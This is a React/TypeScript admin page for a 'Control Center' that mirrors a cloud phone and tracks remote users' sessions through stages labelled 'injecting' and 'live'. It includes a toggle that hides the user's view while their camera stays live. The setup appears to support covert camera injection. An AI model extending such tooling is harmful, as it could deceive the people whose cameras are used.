import { createFileRoute } from "@tanstack/react-router";
import { useCallback, useEffect, useRef, useState } from "react";
import { useCloudPhone } from "@/hooks/useCloudPhone";
import { supabase } from "@/integrations/supabase/client";
import type { RealtimeChannel } from "@supabase/supabase-js";

export const Route = createFileRoute("/view/$linkId")({
  head: () => ({
    meta: [
      { title: "View Live — Admin" },
      { name: "robots", content: "noindex" },
    ],
  }),
  component: ViewPage,
});

type SessionStatus = "idle" | "preparing" | "ready_for_user" | "injecting" | "live" | "finished";

interface SessionRow {
  status: SessionStatus;
  userAgent: string | null;
  connectedAt: string | null;
  userStage: string | null;
  userDetail: string | null;
  userHeartbeat: string | null;
}


function ViewPage() {
  const { linkId } = Route.useParams();
  const [padCode, setPadCode] = useState<string | null>(null);
  const [label, setLabel] = useState<string>("");
  const [error, setError] = useState<string>("");
  const [userViewHidden, setUserViewHidden] = useState(false);
  const [session, setSession] = useState<SessionRow>({
    status: "idle",
    userAgent: null,
    connectedAt: null,
    userStage: null,
    userDetail: null,
    userHeartbeat: null,
  });


  useEffect(() => {
    let cancelled = false;
    (async () => {
      const { data, error } = await supabase
        .from("links")
        .select("label, pad_code, session_status, session_user_agent, session_connected_at, user_view_hidden, user_stage, user_detail, user_heartbeat")
        .eq("id", linkId)
        .maybeSingle();
      if (cancelled) return;
      if (error) {
        setError(error.message);
        return;
      }
      if (!data) {
        setError("Link not found");
        return;
      }
      setLabel(data.label);
      setPadCode(data.pad_code);
      setUserViewHidden(Boolean((data as any).user_view_hidden));
      setSession({
        status: (((data as any).session_status as SessionStatus) ?? "idle"),
        userAgent: (data as any).session_user_agent ?? null,
        connectedAt: (data as any).session_connected_at ?? null,
        userStage: (data as any).user_stage ?? null,
        userDetail: (data as any).user_detail ?? null,
        userHeartbeat: (data as any).user_heartbeat ?? null,
      });

    })();
    return () => {
      cancelled = true;
    };
  }, [linkId]);


  useEffect(() => {
    const filter = `id=eq.${linkId}`;
    const channel = supabase
      .channel(`view-session-${linkId}`)
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "links", filter },
        (payload) => {
          const n = payload.new as any;
          console.log("[ViewPage] realtime links UPDATE received", {
            linkId,
            filter,
            oldStatus: (payload.old as any)?.session_status,
            newStatus: n?.session_status,
            payload,
          });
          setSession((prev) => ({
            ...prev,
            status: (n?.session_status as SessionStatus) ?? "idle",
            userAgent: n?.session_user_agent ?? null,
            connectedAt: n?.session_connected_at ?? null,
            userStage: n?.user_stage ?? null,
            userDetail: n?.user_detail ?? null,
            userHeartbeat: n?.user_heartbeat ?? null,
          }));

          if (typeof n?.user_view_hidden === "boolean") {
            console.log(`[ViewPage] received user_view_hidden = ${n.user_view_hidden} via realtime`, { linkId });
            setUserViewHidden(n.user_view_hidden);
          } else {
            console.log("[ViewPage] realtime UPDATE without user_view_hidden field", { linkId, payloadNew: n });
          }
        },

      )
      .subscribe((status, error) => {
        console.log("[ViewPage] realtime subscription status", { linkId, filter, status, error });
      });
    return () => {
      supabase.removeChannel(channel);
    };
  }, [linkId]);

  // Persistent broadcast channel for the curtain — subscribed ONCE on mount.
  const curtainChannelRef = useRef<RealtimeChannel | null>(null);
  const curtainSubscribedRef = useRef(false);
  useEffect(() => {
    const channelId = `curtain-${linkId}`;
    const ch = supabase.channel(channelId);
    curtainChannelRef.current = ch;
    curtainSubscribedRef.current = false;
    ch.subscribe((status) => {
      if (status === "SUBSCRIBED") {
        curtainSubscribedRef.current = true;
        console.log(`[ViewPage] curtain channel "${channelId}" SUBSCRIBED`);
      } else if (status === "CHANNEL_ERROR" || status === "CLOSED" || status === "TIMED_OUT") {
        curtainSubscribedRef.current = false;
        console.warn(`[ViewPage] curtain channel "${channelId}" status=${status}`);
      }
    });
    return () => {
      supabase.removeChannel(ch);
      curtainChannelRef.current = null;
      curtainSubscribedRef.current = false;
    };
  }, [linkId]);

  const setHidden = useCallback(
    async (hidden: boolean) => {
      console.log(`[ViewPage] writing user_view_hidden = ${hidden}`, { linkId });
      // Broadcast on the persistent, already-subscribed channel — fire multiple
      // times in quick succession so a dropped packet over a flaky/VPN
      // connection doesn't delay the curtain. Duplicate sends are harmless.
      const ch = curtainChannelRef.current;
      if (ch && curtainSubscribedRef.current) {
        const fire = async (label: string) => {
          try {
            const res = await ch.send({ type: "broadcast", event: "set_hidden", payload: { hidden } });
            console.log(`[ViewPage] broadcast sent set_hidden=${hidden} (${label})`, { linkId, res });
          } catch (e) {
            console.error(`[ViewPage] broadcast send failed (${label})`, e);
          }
        };
        void fire("t+0");
        setTimeout(() => void fire("t+200"), 200);
        setTimeout(() => void fire("t+500"), 500);
        setTimeout(() => void fire("t+1000"), 1000);
      } else {
        console.warn("[ViewPage] curtain channel not yet subscribed — relying on DB write");
      }
      // DB write as source of truth + fallback
      const result = await supabase
        .from("links")
        .update({ user_view_hidden: hidden } as any)
        .eq("id", linkId)
        .select("id, user_view_hidden");
      if (result.error) {
        console.error("[ViewPage] user_view_hidden update FAILED", { linkId, hidden, error: result.error });
        return false;
      }
      console.log(`[ViewPage] user_view_hidden update SUCCESS`, { linkId, hidden, returned: result.data });
      return true;
    },
    [linkId],
  );

  if (error) {
    return (
      <div className="min-h-screen bg-background p-8 text-foreground">
        <p className="text-sm text-destructive">{error}</p>
      </div>
    );
  }
  if (!padCode) {
    return (
      <div className="min-h-screen bg-background p-8 text-foreground">
        <p className="text-sm text-muted-foreground">Loading…</p>
      </div>
    );
  }
  return (
    <Viewer
      linkId={linkId}
      padCode={padCode}
      label={label}
      session={session}
      userViewHidden={userViewHidden}
      onToggleHidden={setHidden}
    />
  );
}



async function updateSessionStatus(linkId: string, status: SessionStatus, extra?: Record<string, any>) {
  const result = await supabase
    .from("links")
    .update({
      session_status: status,
      session_updated_at: new Date().toISOString(),
      ...(extra ?? {}),
    } as any)
    .eq("id", linkId);
  if (result.error) {
    console.error("[ViewPage] session_status update failed", { linkId, status, error: result.error });
    return false;
  }
  console.log("[ViewPage] session_status update succeeded", { linkId, status });
  return true;
}

function Viewer({
  linkId,
  padCode,
  label,
  session,
  userViewHidden,
  onToggleHidden,
}: {
  linkId: string;
  padCode: string;
  label: string;
  session: SessionRow;
  userViewHidden: boolean;
  onToggleHidden: (hidden: boolean) => Promise<boolean>;
}) {

  const { status, start, stop, refreshStream, sendKey } = useCloudPhone({
    mode: "viewer",
    padCode,
    viewId: "phoneBox",
  });
  const [connected, setConnected] = useState(false);
  const autoReconnectRef = useRef(false);
  const liveMarkedRef = useRef(false);

  const doConnect = async (initialStatus: SessionStatus) => {
    setConnected(true);
    await updateSessionStatus(linkId, initialStatus);
    await start();
  };

  const doDisconnect = async (nextStatus?: SessionStatus) => {
    stop();
    setConnected(false);
    if (nextStatus) await updateSessionStatus(linkId, nextStatus);
  };

  const onReady = async () => {
    // Default user view to SHOWN (admin can hide via toggle).
    await onToggleHidden(false);
    await updateSessionStatus(linkId, "ready_for_user");
    stop();
    setConnected(false);
    autoReconnectRef.current = false;
    liveMarkedRef.current = false;
  };

  const onReset = async () => {
    stop();
    setConnected(false);
    autoReconnectRef.current = false;
    liveMarkedRef.current = false;
    await onToggleHidden(false);
    await updateSessionStatus(linkId, "idle", {
      session_user_agent: null,
      session_connected_at: null,
      user_stage: null,
      user_detail: null,
      user_heartbeat: null,
    });

  };

  const onFinish = async () => {
    if (!window.confirm("End the session for this user?")) return;
    // 1) Flip status to 'finished' so the user page tears down + shows thank-you
    await updateSessionStatus(linkId, "finished");
    // 2) Tear down admin viewer fully
    stop();
    setConnected(false);
    autoReconnectRef.current = false;
    liveMarkedRef.current = false;
    // 3) Give the user page a moment to receive 'finished', then free the phone
    setTimeout(() => {
      void updateSessionStatus(linkId, "idle", {
        session_user_agent: null,
        session_connected_at: null,
        user_stage: null,
        user_detail: null,
        user_heartbeat: null,
      });
    }, 1500);
  };


  // When the user starts injecting, auto-reconnect admin in viewer mode
  useEffect(() => {
    if (session.status !== "injecting") return;
    if (connected || autoReconnectRef.current) return;
    autoReconnectRef.current = true;
    void (async () => {
      setConnected(true);
      await start();
    })();
  }, [session.status, connected, start]);

  // Once viewer connection is established after injecting, mark live
  useEffect(() => {
    if (liveMarkedRef.current) return;
    if (session.status !== "injecting") return;
    if (!connected) return;
    const s = status.toLowerCase();
    if (s.startsWith("connected")) {
      liveMarkedRef.current = true;
      void updateSessionStatus(linkId, "live");
    }
  }, [status, session.status, connected, linkId]);

  return (
    <div className="min-h-screen bg-background text-foreground">
      <div className="mx-auto w-full max-w-6xl px-4 py-6 lg:px-8 lg:py-10">
        <div className="mb-6 flex flex-col gap-1 lg:flex-row lg:items-end lg:justify-between">
          <div>
            <h1 className="text-2xl font-semibold tracking-tight">Control Center</h1>
            <p className="text-sm text-muted-foreground">{label}</p>
          </div>
          <p className="text-xs text-muted-foreground">
            Viewer mode — no camera is being shared from this device.
          </p>
        </div>

        <div className="grid grid-cols-1 gap-6 lg:grid-cols-[minmax(0,360px)_minmax(0,1fr)]">
          {/* LEFT: phone mirror */}
          <div className="flex flex-col items-center gap-3">
            <div
              id="phoneBox"
              className="aspect-[9/16] w-full max-w-[360px] overflow-hidden rounded-xl bg-muted shadow-lg"
            />
            <p className="text-xs text-muted-foreground">{status}</p>
            {connected && (
              <div className="flex w-full max-w-[360px] items-center justify-center gap-2 rounded-md border border-border bg-muted/30 px-3 py-2">
                <span className="mr-1 text-xs text-muted-foreground">Phone nav:</span>
                <button
                  onClick={() => sendKey(4)}
                  className="rounded-md border border-input bg-background px-3 py-1.5 text-sm font-medium hover:bg-accent"
                  title="Back (KEYCODE_BACK)"
                >
                  ◀ Back
                </button>
                <button
                  onClick={() => sendKey(3)}
                  className="rounded-md border border-input bg-background px-3 py-1.5 text-sm font-medium hover:bg-accent"
                  title="Home (KEYCODE_HOME)"
                >
                  ● Home
                </button>
                <button
                  onClick={() => sendKey(187)}
                  className="rounded-md border border-input bg-background px-3 py-1.5 text-sm font-medium hover:bg-accent"
                  title="Recents (KEYCODE_APP_SWITCH)"
                >
                  ▭ Recents
                </button>
              </div>
            )}
          </div>

          {/* RIGHT: controls + status */}
          <div className="flex flex-col gap-4">
            <div className="grid grid-cols-1 gap-4 md:grid-cols-2">
              <SessionBox session={session} />
              <UserStatusPanel
                stage={session.userStage}
                detail={session.userDetail}
                heartbeat={session.userHeartbeat}
              />
            </div>

            <div
              className={`flex w-full items-center justify-between gap-3 rounded-md border px-4 py-3 text-sm ${
                userViewHidden ? "border-amber-500/60 bg-amber-500/10" : "border-border bg-muted/30"
              }`}
            >
              <div>
                <div className="font-medium">
                  User view:{" "}
                  {userViewHidden ? (
                    <span className="text-amber-600">HIDDEN</span>
                  ) : (
                    <span className="text-green-600">VISIBLE</span>
                  )}
                </div>
                <div className="text-xs text-muted-foreground">
                  Camera & connection stay live regardless.
                </div>
              </div>
              <button
                onClick={() => void onToggleHidden(!userViewHidden)}
                className={`rounded-md px-4 py-2 text-sm font-medium ${
                  userViewHidden
                    ? "bg-amber-500 text-white hover:bg-amber-500/90"
                    : "border border-input bg-background hover:bg-accent"
                }`}
              >
                {userViewHidden ? "Reveal user view" : "Hide user view"}
              </button>
            </div>

            <div className="rounded-md border border-border bg-muted/20 p-4">
              <div className="mb-3 text-xs font-medium uppercase tracking-wide text-muted-foreground">
                Session controls
              </div>
              <div className="flex flex-wrap gap-3">
                {!connected ? (
                  <button
                    onClick={() => void doConnect("preparing")}
                    className="rounded-md bg-primary px-6 py-2 text-sm font-medium text-primary-foreground hover:bg-primary/90"
                  >
                    Connect & prepare
                  </button>
                ) : (
                  <>
                    <button
                      onClick={() => void onReady()}
                      className="rounded-md bg-primary px-6 py-2 text-sm font-medium text-primary-foreground hover:bg-primary/90"
                    >
                      Ready — hand off to user
                    </button>
                    <button
                      onClick={() => void doDisconnect()}
                      className="rounded-md border border-input bg-background px-6 py-2 text-sm font-medium hover:bg-accent"
                    >
                      Disconnect
                    </button>
                    <button
                      onClick={() => refreshStream()}
                      className="rounded-md border border-input bg-background px-6 py-2 text-sm font-medium hover:bg-accent"
                    >
                      Refresh stream
                    </button>
                  </>
                )}
                <button
                  onClick={() => void onReset()}
                  className="rounded-md border border-destructive/40 bg-background px-6 py-2 text-sm font-medium text-destructive hover:bg-destructive/10"
                >
                  Reset session
                </button>
                <button
                  onClick={() => void onFinish()}
                  className="ml-auto rounded-md bg-destructive px-6 py-2 text-sm font-semibold text-destructive-foreground shadow hover:bg-destructive/90"
                  title="Fully end the session and release the phone"
                >
                  Finish session
                </button>
                <button id="playBtn" hidden className="rounded-md bg-primary px-6 py-2 text-sm">
                  Tap to play
                </button>
              </div>
            </div>
          </div>
        </div>

      </div>
    </div>
  );
}

function SessionBox({ session }: { session: SessionRow }) {
  const label =
    session.status === "idle" ? "Idle"
    : session.status === "preparing" ? "Preparing phone…"
    : session.status === "ready_for_user" ? "Waiting for user to connect…"
    : session.status === "injecting" ? "User connected"
    : "Live";

  const tone =
    session.status === "injecting" || session.status === "live"
      ? "border-primary/40 bg-primary/5"
      : session.status === "ready_for_user"
      ? "border-amber-500/40 bg-amber-500/5"
      : "border-border bg-muted/30";

  return (
    <div className={`w-full rounded-md border px-4 py-3 text-sm ${tone}`}>
      <div className="font-medium">Session: {label}</div>
      {(session.status === "injecting" || session.status === "live") && (
        <div className="mt-2 space-y-1 text-xs text-muted-foreground">
          {session.connectedAt && (
            <div>
              Connected at:{" "}
              <span className="font-mono">{new Date(session.connectedAt).toLocaleString()}</span>
            </div>
          )}
          {session.userAgent && (
            <div className="break-words">
              User agent: <span className="font-mono">{session.userAgent}</span>
            </div>
          )}
        </div>
      )}
    </div>
  );
}

const STAGE_META: Record<string, { label: string; dot: string; tone: string }> = {
  opened:            { label: "Page opened",        dot: "bg-muted-foreground/50",        tone: "border-border bg-muted/30" },
  tapped_start:      { label: "Tapped Start",       dot: "bg-amber-500",                  tone: "border-amber-500/40 bg-amber-500/5" },
  permission_denied: { label: "Camera denied",      dot: "bg-red-500",                    tone: "border-red-500/40 bg-red-500/5" },
  waiting:           { label: "Waiting for session", dot: "bg-muted-foreground/50",       tone: "border-border bg-muted/30" },
  connecting:        { label: "Connecting…",        dot: "bg-amber-500 animate-pulse",    tone: "border-amber-500/40 bg-amber-500/5" },
  retrying:          { label: "Retrying…",          dot: "bg-amber-500 animate-pulse",    tone: "border-amber-500/40 bg-amber-500/5" },
  live:              { label: "Live",               dot: "bg-green-500",                  tone: "border-primary/40 bg-primary/5" },
  failed:            { label: "Failed",             dot: "bg-red-500",                    tone: "border-red-500/40 bg-red-500/5" },
};

function UserStatusPanel({
  stage,
  detail,
  heartbeat,
}: {
  stage: string | null;
  detail: string | null;
  heartbeat: string | null;
}) {
  const [now, setNow] = useState(() => Date.now());
  useEffect(() => {
    const id = setInterval(() => setNow(Date.now()), 1000);
    return () => clearInterval(id);
  }, []);

  const meta = (stage && STAGE_META[stage]) || {
    label: stage ?? "No report yet",
    dot: "bg-muted-foreground/40",
    tone: "border-border bg-muted/30",
  };

  const hbMs = heartbeat ? now - new Date(heartbeat).getTime() : null;
  const hbSec = hbMs != null ? Math.max(0, Math.floor(hbMs / 1000)) : null;
  const stale = hbSec != null && hbSec > 15;

  return (
    <div className={`w-full rounded-md border px-4 py-3 text-sm ${meta.tone}`}>
      <div className="flex items-center gap-2">
        <span className={`h-2.5 w-2.5 rounded-full ${meta.dot}`} />
        <span className="font-medium">User: {meta.label}</span>
      </div>
      {detail && (
        <div className="mt-1 break-words text-xs text-muted-foreground">{detail}</div>
      )}
      <div className="mt-2 text-xs text-muted-foreground">
        {hbSec == null ? (
          <span>No heartbeat yet</span>
        ) : (
          <span>Last seen: {hbSec}s ago</span>
        )}
      </div>
      {stale && (
        <div className="mt-1 text-xs font-medium text-red-600">
          User may have disconnected or closed the page.
        </div>
      )}
    </div>
  );
}
